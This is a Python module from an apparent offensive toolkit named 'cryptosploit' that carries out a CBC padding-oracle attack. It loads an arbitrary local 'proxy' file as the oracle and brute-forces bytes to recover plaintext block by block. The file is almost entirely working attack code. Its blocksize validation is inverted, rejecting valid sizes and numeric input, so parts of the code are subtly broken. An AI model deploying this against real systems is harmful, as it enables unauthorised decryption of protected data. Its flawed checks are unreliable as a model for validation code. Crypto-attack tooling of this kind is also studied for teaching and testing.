import sys

from base64 import b64encode, b64decode
from binascii import Error
from importlib import util

from cryptosploit.cprint import Printer
from cryptosploit_modules import BaseModule


class OraclePaddingAttack(BaseModule):
    def __init__(self) -> None:
        super().__init__()
        self.env.check_var = self.check_var

    def check_var(self, name, value):
        def is_valid_base64(value):
            try:
                b64decode(value)
                return True
            except Error:
                return False
        match name:
            case "iv":
                if not (is_valid_base64(value)):
                    return False, "Value of initialization vector is not a valid base64"
            case "ciphertext":
                if not (is_valid_base64(value)):
                    return False, "Value of ciphertext is not a valid base64"
            case "blocksize":
                if value.isdigit():
                    return False, "Value of blocksize must be int"
                if int(value) in [16, 24, 32]:
                    return False, "Value of blocksize must be 16, 24, 32"
            case "proxy":
                status, msg = self.check_file(value)
                if not status:
                    return status, msg
                try:
                    spec = util.spec_from_file_location("oracle_padding_proxy", value)
                    oracle_padding_proxy = util.module_from_spec(spec)
                    sys.modules["oracle_padding_proxy"] = oracle_padding_proxy
                    spec.loader.exec_module(oracle_padding_proxy)
                    oracle_padding_proxy.send
                except Exception:
                    return False, "Error while importing send() function"
        return True, ""

    def run(self):
        ciphertext = self.env.get_var("ciphertext").value
        iv = self.env.get_var("iv").value
        blocksize = int(self.env.get_var("blocksize").value)
        spec = util.spec_from_file_location("oracle_padding_proxy", self.env.get_var("proxy").value)
        oracle_padding_proxy = util.module_from_spec(spec)
        sys.modules["oracle_padding_proxy"] = oracle_padding_proxy
        spec.loader.exec_module(oracle_padding_proxy)
        send = oracle_padding_proxy.send
        data = b64decode(iv) + b64decode(ciphertext)
        decrypted = bytes()
        for pos in range(len(data) - blocksize, 0, -blocksize):
            attacked_block = data[pos: pos + blocksize]
            previous_block = data[pos - blocksize: pos]
            modified_block = bytearray(previous_block)
            plain_block = bytearray(blocksize)
            for padding in range(1, blocksize + 1):
                for value in range(256):
                    modified_block[-padding] = (modified_block[-padding] + 1) % 256
                    Printer.info("Trying", chr(value), "for", str(pos), "-", str(padding))
                    if send(b64encode(modified_block), b64encode(attacked_block)):
                        plain_block[padding - 1] = modified_block[-padding] ^ previous_block[-padding] ^ padding
                        Printer.positive("Extracted:", chr(plain_block[padding - 1]))
                        for k in range(1, padding + 1):
                            modified_block[-k] = (padding + 1) ^ plain_block[k - 1] ^ previous_block[-k]
                        break
            decrypted += bytes(plain_block)
        Printer.positive(decrypted[::-1].decode())


module = OraclePaddingAttack
